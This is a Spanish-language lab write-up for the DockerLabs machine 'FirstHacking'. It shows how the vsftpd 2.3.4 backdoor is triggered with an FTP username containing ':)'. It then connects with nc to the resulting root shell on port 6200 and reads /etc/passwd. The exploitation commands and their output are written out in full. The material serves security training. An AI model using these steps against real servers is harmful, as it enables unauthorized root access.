# DockerLabs — FirstHacking | Writeup

> Writeup de la máquina **FirstHacking** de la plataforma [DockerLabs](https://dockerlabs.es).
> Dificultad: **Muy Fácil**

---

## Resumen

| Campo | Valor |
|---|---|
| **Plataforma** | DockerLabs |
| **Máquina** | FirstHacking |
| **Dificultad** | Muy Fácil |
| **IP objetivo** | `172.17.0.2` |
| **Técnicas clave** | Enumeración de servicios · Backdoor vsftpd 2.3.4 |
| **Objetivo** | Conseguir acceso como `root` |

---

## Despliegue de la máquina

```bash
sudo bash auto_deploy.sh firsthacking.tar
```

```
Estamos desplegando la máquina vulnerable, espere un momento.
Máquina desplegada, su dirección IP es --> 172.17.0.2
Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

---

## Fase 1 — Reconocimiento

Un escaneo de puertos con `nmap` sobre `172.17.0.2` revela un único servicio expuesto:

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4
```

**FTP (21)** corriendo **vsftpd 2.3.4**: versión conocida por un backdoor histórico.

---

## Fase 2 — Identificación de la vulnerabilidad

En 2011 el código fuente oficial de **vsftpd 2.3.4** fue comprometido e infectado con una puerta trasera: si el **usuario** enviado en el login FTP contiene la secuencia **`:)`**, el servidor abre una shell con privilegios de `root` en el puerto **6200**.

---

## Fase 3 — Explotación

### Paso 1 — Disparar el backdoor vía FTP

```bash
ftp 172.17.0.2
```

```
Connected to 172.17.0.2.
220 (vsFTPd 2.3.4)
Name (172.17.0.2:kali): user:)
331 Please specify the password.
Password:
```

El usuario `user:)` contiene la carita que activa el backdoor. La contraseña introducida es indiferente; basta con que se envíe.

### Paso 2 — Conectarse a la shell oculta

Tras disparar el backdoor, el puerto `6200` queda abierto con una shell de root. Nos conectamos con `netcat`:

```bash
nc 172.17.0.2 6200
```

```
whoami
root
```

Acceso como **root** conseguido sin necesidad de exploits externos ni escalada posterior.

---

## Fase 4 — Post-explotación

Enumeración de usuarios del sistema:

```bash
cat /etc/passwd
```

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
...
```

Solo `root` dispone de una shell válida (`/bin/bash`); el resto son cuentas de servicio sin login interactivo.

---

## Limpieza

Para eliminar el contenedor al terminar, se pulsa `Ctrl+C` en la terminal donde se ejecutó `auto_deploy.sh`.

---

## Conclusión

FirstHacking es una máquina introductoria centrada en un único concepto:

1. **Reconocimiento** → identificar el servicio y su versión expuestos (vsftpd 2.3.4).
2. **Vulnerabilidad conocida** → esa versión concreta tiene un backdoor público y documentado.
3. **Explotación trivial** → basta con un login FTP malformado (`usuario:)`) para activar una shell de root en el puerto 6200.

Lección clave: una versión de software desactualizada o vulnerable puede comprometer el sistema por completo sin necesidad de técnicas complejas.

---

> *Writeup realizado con fines educativos en un entorno de laboratorio controlado (DockerLabs).*
